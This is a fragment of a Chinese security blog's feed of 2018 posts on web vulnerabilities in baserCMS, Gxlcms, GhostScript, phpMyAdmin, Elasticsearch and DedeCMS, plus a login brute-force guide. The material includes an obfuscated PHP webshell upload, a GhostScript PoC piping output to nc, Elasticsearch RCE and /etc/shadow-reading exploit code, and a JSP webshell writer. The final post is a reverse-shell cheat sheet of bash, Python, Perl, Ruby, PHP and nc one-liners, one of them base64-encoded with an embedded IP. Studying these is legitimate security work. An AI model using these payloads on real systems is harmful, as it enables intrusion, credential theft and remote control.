deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: BASERCMS=vfshte61c73tufbvit1j63amv2Connection: close------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;_method&quot;POST------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[_Token][key]&quot;65d6c82611c9eb9840aef42c97d82c36847093f574cbe4c2cb7964537a3d594b19d92b9c116bd3595e0f14ba510a880e1a2573033f81a71dd25800d09917183a------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_main]&quot;e371e3------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_sub]&quot;21b537------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_link]&quot;1808f5------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_hover]&quot;ed8815------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo]&quot;; filename=&quot;x.php&quot;Content-Type: application/octet-stream&lt;?php $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; $a($_GET[cc]); ?&gt;------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_alt]&quot;baserCMS------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_link]&quot;... Then according to the code description, you can get the webshell path:http://127.0.0.1/basercms/files/theme_configs/logo.phpCommand execution: Solution:Whitelist restrictions on upload file suffixes such as (jpg, png, gif, jpeg etc.)Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. Announcement address Vulnerability information page:https://basercms.net/security/CVE-2018-18942_CVE-2018-18943]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>漏洞披漏</tag>
        <tag>代码审计</tag>
        <tag>baserCMS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[glxcms漏洞披漏]]></title>
    <url>%2F2018%2F10%2F18%2Fglxcms%2F</url>
    <content type="text"><![CDATA[cms简介Gxlcms新闻系统是一个以php+mysql进行开发的新闻类cms内容管理系统。Gxlcms新闻系统的优势：前台与后台采用隔离方式，模板化设计，让只要你会前端就可以做一个新闻网站！后台设计简单明了，小白用户一看就会明白！程序功能也非常完善！1.目前程序支持三种路由模式：静态生成，伪静态，动态；2.支持两种存储模式：本地存储，FTP存储3.接入百度主动推送功能！让你每篇新闻/资讯都可以及时被百度发现4.图片水印功能：只要开启图片水印，不管是标图图片或者是内容图片统统添加水印，水印功能支持9宫格设计，让你可以随意把图片水印加到任意地方5.数据库一键备份/还原，让你可以轻松的把网站迁移到任何服务器上6.缓存功能：模板缓存，数据库缓存，网站页面缓存7.友情链接：支持图片链接和文字链接8.广告模块：只要后台添加广告后，全部js生成到前台，让你不用费事修改模板9.采集功能，我们支持火车头采集，火车头接口已经在插件中心里面，只需要你下载后，就可以采集上万新闻内容，为了防止重名新闻，我们对接口做了细腻化的功能，支持入库重名判断，当有重名新闻自动过滤10.扩展功能：扩展性，可以在插件中心下载，招聘模块，图集模块，会员中心模块，交友模块等等模块进行安装（开发中）源码下载地址:Demo地址：官网更新补丁链接：待补充 漏洞详情：1、后台sql注入漏洞(CVE-2018-18488)漏洞分析从\lib\admin\action\dataaction.class.php文件中处理数据库备份方法可知：$table是从$_POST[‘ids’]中传入，且可控。然后，在32行代码中与TRUNCATE TABLE 拼接存入sql文件，然后在后续导入还原功能中执行，因此我们可以控制生成的sql文件，并且执行任意sql语句。构造sql注入语句：12ids%5B%5D=gxl_actor`;select sleep(3);--%20 我们发送数据包后，生成的sql文件如下所示：然后在进行备份还原：可看到延迟，我们注入select sleep(1)后通过sql备份还原功能执行sql文件：因此判断存在注入。 修复建议：对ids参数值进行过滤 2、前台任意sql备份文件下载：(CVE-2018-18487)漏洞分析从\lib\admin\action\dataaction.class.php文件中处理数据库备份方法可知生成备份文件的方法如下：看到mt_rand函数： 然后结合cms的sql文件生成代码:Sql文件名字：年月日_随机数_1.sql 通过随机数值来爆破种子的过程，外国朋友写了一个工具：php_mt_seed（官方使用说明：http://www.openwall.com/php_mt_seed/README ）。使用工具获得随机数，拼接sql文件名称。然后在管理员未修改源码目录的情况下访问默认路径即可未授权下载备份的sql文件： 修复建议：可参考phpcms小于V9.6.2 authkey泄露的修复方式在每次生成随机数之前都手动播种一次，或者采用时间戳的方式。 参考链接：https://xz.aliyun.com/t/31]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>漏洞披漏</tag>
        <tag>glxcms</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GhostScript沙箱绕过]]></title>
    <url>%2F2018%2F08%2F23%2F23%2F</url>
    <content type="text"><![CDATA[背景8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 ghostscript 的安全沙箱可以被绕过，通过构造恶意的图片内容，可造成命令执行。ghostscript应用广泛，ImageMagick、python-matplotlib、libmagick 等图像处理应用均有引用。在ghostscript中由于以往的安全事件，针对安全问题gs官方采用增加参数-dSAFER来开启安全沙箱，但该沙箱在程序执行过程中由LockSafetyParams这个值进行控制，此次Taviso发现通过restore操作会将该值成功覆盖，导致安全沙箱被绕过，引发命令执行漏洞。 复现：测试：vps开启监听端口后，对图片上传功能进行测试，上传含有攻击数据的图片： 服务器收到回显： poc：12345678%!PSuserdict /setpagedevice undefsavelegal&#123; null restore &#125; stopped &#123; pop &#125; if&#123; legal &#125; stopped &#123; pop &#125; ifrestoremark /OutputFile (%pipe%whoami|nc ip port) currentdevice putdeviceprops 漏洞影响：version &lt;= 9.23（全版本、全平台）所有引用ghostscript的上游应用如：imagemagicklibmagickgraphicsmagickgimppython-matplotlibtexlive-coretexmacslatex2htmllatex2rtf等 缓解措施：1、卸载ghostscript。2、使用ImageMagick，建议修改policy文件。（默认位置：/etc/ImageMagick/policy.xml），在 中加入以下 （即禁用 PS、EPS、PDF、XPS coders） 参考信息：1、漏洞分析：https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247485615&amp;idx=1&amp;sn=b25c47324b771266c0d62cb46c263f42&amp;chksm=fe250daec95284b81a882aeecf36a50e39d8fb7e7e82ac4affd16b7f60ddb6741c99aeb851b3&amp;scene=21#wechat_redirect2、邮件列表：https://bugs.chromium.org/p/project-zero/issues/detail?id=1640]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>GhostScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-12613漏洞学习总结]]></title>
    <url>%2F2018%2F07%2F25%2F22%2F</url>
    <content type="text"><![CDATA[前言：在漏洞披漏之后，就对该漏洞进行了分析复现，本来打算投freebuf，谁知道被抢了先2333，贴图留念～～～ CVE-2018-12613：2018年6月19日，phpMyAdmin在最新版本修复了一个严重级别的漏洞。攻击者必须拥有后台权限，phpMyAdmin4.8.0和4.8.1均受漏洞影响。 漏洞分析： 首先在如下图所示的index.php中存在一处包含指定文件的代码： 需要成功包含，必须满足if区间中的五个条件：target参数值不为空；target参数值为字符串；target参数值不以index开头；target参数值不在黑名单中；过checkPageValidity函数的检查。其中第四个条件的黑名单即51行中import.php与export.php；第五个条件需要查看该函数： 可以看到core类的checkPageValidity函数中又必须经过以下的五个判断：1、$whitelist为空就引用申明的$goto_whitelist2、$page如果没有定义或者$page不为字符串就返回false3、$page如果存在在$whitelist中返回true4、如果$_page存在在$whitelist中返回true5、经过urldecode函数解码后的$_page存在在$whitelist中返回true我们可以看到在index.php调用checkPageValidity函数时没有传入其他参数，因此会进入第一个判断，而$goto_whitelist如下所示： 它定义了很多可以被包含的文件名。然后第二个判断可以跳过；看第三个判断，可以看到$page参数是不在$whitelist中的，此处不满足；看第四个判断，这个判断是对$_page进行的，校验$_page是否在白名单中，而$_page是将$page值末尾加上’?’后从字符串第0位开始分割，取其中第一次出现?之前的内容，如下图所示：target=sql.ph%3fp时： 因此此处可以用’$target=db_sql.php?/../../被包含文件’来满足条件，但是$target进入到index.php的include()中，被包含的文件无法打开，出现报错。（windows文件命名规则中规定了文件名不能出现特殊字符，linux为服务器的情况下，是可以使用？直接进行绕过） 第五个判断，先将$page进行urldecode解码，然后再进行？的分割，取值进行判断，只要解码后分割出来的值在$whitelist中即可满足条件。而在$target 里问号被二次编码为%253f， db_sql.php%253f也会被认为是一个目录，可以用../跨越，成功实现包含。因此命名规范里面没有将%放进去也是该漏洞能在windows下成功利用的一个关键点。 这样我们可以将？进行二次编码。如果传入target=db_sql.php%253f。在第四个判断中进行白名单校验时，为db_sql.php%3f，不满足，第五个判断的urldecode后，进行校验时为db_sql.php,符合条件，然后即可成功包含文件。 复现心得：getshell方式 1、上传sql文件，然后进行包含。2、开启webshell日志功能，查询webshell语句后，包含日志。3、将webshell写入字段中，如果数据库在本地，可以直接通过查询数据库文件位置：select @@datadir；然后得到数据库文件存放路径，而字段内容则在数据库名/表名.frm中 说明图1： 说明图2： 4、通过phpsession文件包含，首先执行查找webshell的语句，然后在cookie中的phpmyadmin参数中可看到session文件名。说明图1： 说明图2 getshell方式： 目前官方已修复漏洞，更新至最新版本可不受此漏洞影响。]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
        <tag>漏洞总结</tag>
        <tag>CVE-2018-12613</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何对经前端加密后的数据进行爆破]]></title>
    <url>%2F2018%2F07%2F23%2F21%2F</url>
    <content type="text"><![CDATA[1.1 简述：最近遇到两个个案例，经过一番倒腾，发现其登录功能均可撞库。但是都存在登录数据本地加密，有空了放一起总结记录一下。 2.1 案例1(RSA本地加密):2.1.1 摸底： 首先，进行正常登录逻辑测试，发现该系统登录逻辑分下面两步：1、输入正确用户名密码，校验正确后，向注册手机号发送验证码。2、输入正确验证码，登录系统。 从该逻辑可知此处可通过填写登录用户名密码后是否发送验证码来判断输入数据是否为正确用户登录凭证，由于站点未对获取验证码提交频率作任何限制，从而可自动化提交来获取该站点正确用户名密码。 2.1.2 演习： 在google的过程中，很快的找到了一款burpsuite套件：jsEncrypter（感谢作者提供这么利索的插件）。下载地址：https://github.com/c0ny1/jsEncrypter/releases。安装完成后，我们将jsencrypt.min.js下载至本地。然后对站点系统前端代码进行调试，分析前端处理过程，编写js模板文件。 对登录过程进行调试： 在审计前端源代码页面中，可以找到，在ui目录下的lib文件夹下有一个security文件夹，而其中的rsa_util.js就是调用jsencrypt.min.js文件种的JSEncrypt方法对用户名密码进行加密。 下图为动态调试结果： 我们可以很清楚看到加密过程，然后根据jsEncrypter的readme文档中的使用指南，我们可以根据其调用逻辑，自行编写一个jsEncrypter_rsa.js文件，来调用jsencrypt.min.js文件为我们的明文数据进行加密。 这里有两个小坑： 1、由动态调试可知，公钥_pubk在cookie中以url编码后的方式存储，因此，我们本地调用，需要解码一下，在这里，对于换行符，需要用\n替换。2、由于jsEncrypter插件使用了phantomjs平台，而phantomjs支持url解码的函数为encodeURIComponent。因此不能使用与系统前端一致的encodeURI函数。 然后仿写系统加密的方式，将公钥以及调用逻辑写入到我们自己的js文件中： 2.1.3 攻击：1、运行phantomJS并测试 2、Burpsuite验证，调用成功： 3、抓包，加载字典，实施爆破：（两个参数的字典都使用插件） 然后，成功爆破: 2.2 案例2(md5本地加密):2.2.1 摸底： 首先通过分析用户登录过程，发现该站点登录无验证码，可多次提交登录数据，但是其用户名密码在本地进行了md5加密处理。因此，撞库之前需要本地实现将字典进行加密操作后再提交。对登录功能抓包分析后，可以看到在填写用户名密码后，前端发送如下数据包获取cd、salt数据包： 此处存在salt泄漏风险，可遍历手机号，对于未注册⽤用户，返回值⽆salt，对于已注册⽤户salt值恒定。而实施撞库，需要先请求得到salt与cd值。 然后可从前端代码中得到加密用户名密码过程： pass经过本地md5加密后， 发送至服务端进行登录校验。 2.2.2 演习：因此，我们只需要用脚本，先输入用户名即手机号，请求得到cd、salt值，然后再从密码字典中，取出密码进行md5加密，最后发包请求即可。编写python脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#-*- coding=utf-8 -*-import requestsimport hashlibimport jsondef GetPass(): fp = open(&quot;./pass.txt&quot;,&quot;r&quot;) if fp == 0: print (&quot;open file error!&quot;) return; while 1: line = fp.readline() if not line: break passwd = line.strip(&apos;\n&apos;) Brute_Force_Dididai(&quot;150****1403&quot;,passwd);def Brute_Force_Dididai(username,password): # url = &quot;&quot; s = requests.Session() s.headers = &#123; &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/51.0.2704.103 Safari/537.36&apos;, &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;, &#125; url = &quot;http://www.foo.com/?m=&amp;s=getcd&quot; data = &#123;&quot;username&quot;:username&#125; html = s.post(url,data = data) print html.content salt_cd = json.loads(html.content) print salt_cd[&apos;salt&apos;] print salt_cd[&apos;cd&apos;] md5_pass = hashlib.md5(password.encode(&apos;utf-8&apos;)).hexdigest()+salt_cd[&apos;salt&apos;] md5_salt = hashlib.md5(md5_pass.encode(&apos;utf-8&apos;)).hexdigest()+str(salt_cd[&apos;cd&apos;]) md5_cd = hashlib.md5(md5_salt.encode(&apos;utf-8&apos;)).hexdigest() print md5_cd url1 = &quot;http://www.foo.com/?m=&amp;s=login_wd&amp;ismd5=1&quot; data1 = &#123;&quot;username&quot;:&quot;username&quot;,&quot;password&quot;:md5_cd&#125; html1 = s.post(url1,data = data1) print html1.content print len(html1.content);GetPass() 然后准备测试pass.txt: 2.2.3 攻击：最后只需要执行脚本即可： 最后是爆破成功返回到数据包，由此可得到正确用户名密码。freebuf地址http://www.freebuf.com/articles/web/184455.html]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>爆破</tag>
        <tag>js加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elsaticsearch 漏洞小结]]></title>
    <url>%2F2018%2F07%2F14%2F20%2F</url>
    <content type="text"><![CDATA[0.因众测过程中遇到了Elsaticsearch未授权访问的情况，搞完发现又把时间浪费在了查各种资料上，故小记一番。 1.果1.1 (CVE-2014-3120)elasticsearch v1.1.1 – 命令执行漏洞利用：1、创建数据： 1234567posturl: http://ip:9200/foo/foo2postdata：&#123; &quot;name&quot;: &quot;data&quot;&#125; 2、执行命令： 12345678910111213141516171819posturl: http://ip:9200/_search?pretty postdata:&#123; &quot;size&quot;: 1, &quot;query&quot;: &#123; &quot;filtered&quot;: &#123; &quot;query&quot;: &#123; &quot;match_all&quot;: &#123; &#125; &#125; &#125; &#125;, &quot;script_fields&quot;: &#123; &quot;command&quot;: &#123; &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot; &#125; &#125;&#125; 其他资料：（1）dockerfile地址https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120（2）https://www.t00ls.net/viewthread.php?tid=29408（3）http://bouk.co/blog/elasticsearch-rce 1.2 （CVE-2015-1427）ElasticSearch Groovy v1.4.2以下 – 沙盒绕过 &amp;&amp; 代码执行漏洞利用：Java沙盒绕过法： java.lang.Math.class.forName(“java.lang.Runtime”).getRuntime().exec(“id”).getText() Goovy直接执行命令法： def command=’id’;def res=command.execute().text;res 123posturl: http://ip:9200/_search?pretty postdata:&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125; 其他资料：(1）dockerfile地址:https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427(2）http://cb.drops.wiki/drops/papers-5107.html(3）http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427(4）https://github.com/XiphosResearch/exploits(5）http://cb.drops.wiki/drops/papers-5142.html 1.3（CVE-2015-3337）ElasticSearch 1.4.5以下/1.5.2以下 – 目录穿越漏洞利用：读服务器上文件：burpsuite的repeater中访问url： 1http://ip:9200/_plugin/head/../../../../../../../../../etc/passwd 其他：（1）原理：在安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。（2）dockerfile地址：https://github.com/vulhub/vulhub/pulse 1.4 （CVE-2015-5531）ElasticSearch 1.6.1以下 – 目录穿越漏洞说明：该漏洞在elasticsearch 1.5.1及以前，无需任何配置即可触发。之后的新版，配置文件elasticsearch.yml中必须存在path.repo，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。 利用1、创建一个仓库： 123456789puturl: /_snapshot/testputdata:&#123; &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123; &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test&quot; &#125;&#125; 2、创建一个快照：123456789puturl: /_snapshot/test2putdata:&#123; &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123; &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test/snapshot-backdata&quot; &#125;&#125; 3、目录穿越访问服务器文件，在burpsuite 中repeater访问：1http://ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd 4、从repeater中将错误信息解码，即可得到对应服务器文件（passwd）信息。 其他资料：（1）原理：elasticsearch中备份的快照保存在备份仓库中的命名格式是以snapshot-xxx的格式,所以snapshot-backdata 会被误以为是test仓库的backdata快照，快照都是文件形式保存的，而snapshot-backdata是目录，elasticsearch 没有区分，如果elasticsearch发现其是目录之后，就继续读取目录下的内容，如果目录下的文件明称是恶意构造的(类似../../../) elasticsearch就会去读取这个递归读取文件的内容（这里elasticsearch没有过滤..），从而导致目录遍历（任意文件内容读取）（2）dockerfile地址：https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531（3）python poc： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bin/env python# -*- coding:utf8 -*-&quot;&quot;&quot;PoC for CVE-2015-5531Affects ElasticSearch 1.6.0 and prior&quot;&quot;&quot;import reimport sysimport jsonimport requestsimport urllibimport argparseimport tracebackimport termcolordef colorize_red(string): &quot;&quot;&quot; :param string: :return &quot;&quot;&quot; return termcolor.colored(string, &apos;red&apos;)def colorize_green(string): &quot;&quot;&quot; :param string: :return: &quot;&quot;&quot; return termcolor.colored(string, &apos;green&apos;)def create_repos(base_url): &quot;&quot;&quot; :param base_url: :return: None &quot;&quot;&quot; for index, repo_name in enumerate(REPO_NAME_LST): url = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(base_url, repo_name) req = requests.post(url, json=DATA_REPO_LST[index]) if “acknowledged” in req.json(): print colorize_green(“repository &#123;0&#125;: create success”.format(repo_name))def grab_file(vuln_url): “”&quot; :param xplurl: :return: “”&quot; req = requests.get(vuln_url) if req.status_code == 400: data = req.json() extrdata = re.findall(r’\d+’, str(data[&apos;error&apos;])) decoder = bytearray() for i in extrdata[2:]: decoder.append(int(i)) print colorize_green(decoder)def exploit(**args): “”&quot; :param args: :return: “”&quot; target = args[&apos;target&apos;] port = args[&apos;port&apos;] fpath = args[&apos;fpath&apos;].split(‘,’) fpath = [urllib.quote(fp, safe=&apos;&apos;) for fp in fpath] base_url = “http://&#123;0&#125;:&#123;1&#125;/_snapshot/”.format(target, port) #create elasticsearch repository for snapshot create_repos(base_url) #grab files for fp in fpath: vuln_url = ‘&#123;0&#125;&#123;1&#125;/&#123;2&#125;&#123;3&#125;’.format(base_url, REPO_NAME_LST[0], FCK, fp) print colorize_red(urllib.unquote(fp)) + “:\n” grab_file(vuln_url)if __name__ == “__main__”: # for global FCK = ‘backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..’ REPO_NAME_LST = [&apos;test11&apos;, &apos;test12&apos;] DATA_REPO_LST = [&#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: &quot;/tmp/test30&quot;&#125;&#125;, &#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: &quot;/tmp/test30/snapshot-backdata&quot;&#125;&#125;] parser = argparse.ArgumentParser(usage=”python cve-2015-5531.py options”, description=”cve-2015-5531 Vuln PoC”, add_help=True) parser.add_argument(‘-t’, ‘–target’, metavar=’TARGET’, type=str, dest=”target”, required=True, help=’eg: 127.0.0.1 or www.baidu.com’) parser.add_argument(‘-p’, ‘–port’, metavar=’PORT’, dest=’port’, type=int, default=9200, help=’elasticsearch port default 9200′) parser.add_argument(‘–fpath’, metavar=’FPATH’, dest=’fpath’, type=str, default=’/etc/passwd,/etc/shadow’, help=’file to grab multi files separated by comma ‘) args = parser.parse_args() try: exploit(**args.__dict__) except: traceback.print_exc() 1.5（WooYun-2015-110216）Elasticsearch（1.5.x以下）– 写入webshell漏洞说明：1、原理：ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。 2、利用方式：在获取其他web服务的根目录后，直接使用ES写入对应木马文件至解析目录即可。如tomcat服务web解析目录为：/usr/local/tomcat/webapps。首先建立一个恶意索引文档：123curl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d&apos;&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;&apos; 再创建一个恶意的存储库，其中location的值即为我要写入的路径。1234567curl -XPUT &apos;http://ip:9200/_snapshot/yz.jsp&apos; -d &apos;&#123; &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123; &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot&quot;, &quot;compress&quot;: false &#125;&#125;&apos; 存储库验证并创建:12345curl -XPUT &quot;http://ip:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &apos;&#123; &quot;indices&quot;: &quot;yz.jsp&quot;, &quot;ignore_unavailable&quot;: &quot;true&quot;, &quot;include_global_state&quot;: false&#125;&apos; 最后访问写入的webshell即可： http://ip:9200/wwwroot/indices/yz.jsp/snapshot-yz.jsp 上面的jsp文件作用为向wwwroot目录下的test.jsp文件写入任意字符如访问下面： http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=test将test.jsp中写入test。只需访问http://ip:8080/wwwroot/test.jsp即可看到其页面显示test。 其他(1) 原理地址：http://cb.drops.wiki/bugs/wooyun-2015-0110216.html(2）dockerfile地址：https://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>getshell</tag>
        <tag>Elsaticsearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[心悸]]></title>
    <url>%2F2018%2F05%2F21%2F%E5%BF%83%E6%82%B8%2F</url>
    <content type="text"><![CDATA[此文永在心中]]></content>
      <categories>
        <category>岁月</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DedeCMS V5.7 SP2后台漏洞小集合]]></title>
    <url>%2F2018%2F04%2F03%2F19%2F</url>
    <content type="text"><![CDATA[记录一下最新版dedecms后台拿服务器的几个方式。01、上传shell 1、后台上传flash文件处未对文件内容作校验，可直接上传shell。2、通过重命名功能： 1http://localhost/dede/file_manage_control.php?fmdo=rename&amp;oldfilename=/uploads/media/xxx/xxxx.swf&amp;newfilename=/sunu11.php 02、写入配置/dede/sys_verifies.php中可写进恶意代码至inc文件 11、http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();// 12、http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo(); 03、数据库写入数据未过滤： 1http://localhost/dedecms/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=xxx&amp;egroup=;phpinfo();$&amp;issign=1 查询： 123http://localhost/dedecms/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=okor:http://localhost/data/enums/;phpinfo();$.php 05、模板问题：1http://localhost/dede/tag_test_action.php?url=a&amp;token=xxxxx&amp;partcode=&#123;dede:mochazz name=&apos;source&apos; runphp=&apos;yes&apos;&#125;phpinfo();&#123;/dede:mochazz&#125;]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Dedecms</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透之反弹shell的几种姿势]]></title>
    <url>%2F2018%2F01%2F26%2F18%2F</url>
    <content type="text"><![CDATA[主要反弹方式 首先vps监听：nc –l –vv –p port 1.bash反弹利用系统特殊设备文件/dev/tcp建立socket发出去，达到反弹shell的效果bash -i&gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1大部分Linux系统可用，但某些iot设备不存在bash无法反弹；存在&gt;、&amp;富豪在对符号处理的情况下无效。 bash -c {echo,IGJhc2ggLWkgPiYgL2Rldi90Y3AvNDUuMzIuMjE5LjI0Mi85MTkxIDAgPiYx==}|{base64,-d}|{bash,-i} 2.telnet反弹适用于nc不可用或者/dev/tcp不可用条件下，其中mknod是创建设备文件mknod test p &amp;&amp; telnet ip port 0&lt;test | /bin/bash 1&gt;test telnet ip port | /bin/bash | telnet ip port 3.Java123r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor() 4.Ruby1ruby -rsocket -e&apos;f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos; 不依赖于/bin/sh的shell：1ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos; 5.PHPphp -r &#39;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; 6.Python(2.7)1python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; 另外的形式：1python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot; 7.Perl1perl -e &apos;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos; 不依赖于/bin/sh的shell：1perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos; 8.nclinux：nc -e /bin/sh ip portWindows：nc -e cmd.exe ip port当不能使用-e参数时：123mknod backpipe p &amp;&amp; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe/bin/sh | nc ip portrm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ip port 0/tmp/ nc版本有问题时：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f对不具有反向链接的nc版本：nc ip port1 |/bin/bash|nc ip port2利用port1传入内容给bash执行,port2传出。 其他方式：/sbin/busybox nc ip port -e /bin/bash /bin/bash -i &gt; /dev/tcp/ip/prot 0&lt;&amp;1 2&gt;&amp;1 针对某些mips架构或busybox系统的路由器或终端：123456789//锐捷mkfifo /tmp/backpipe1 | /bin/sh 0&lt;/tmp/backpipe1 | nc 127.0.0.1 6666 1&gt;/tmp/backpipe1//飞鱼星反弹shellmkfifo /tmp/backpipe1 | /bin/sh 0&lt;/tmp/backpipe1 | /bin/busybox nc 127.0.0.1 6666 1&gt;/tmp/backpipe1learning from 孙涛(红队实战攻防技术分享：Linux后门总结-SSH利用篇原创) 9.lua1lua -e 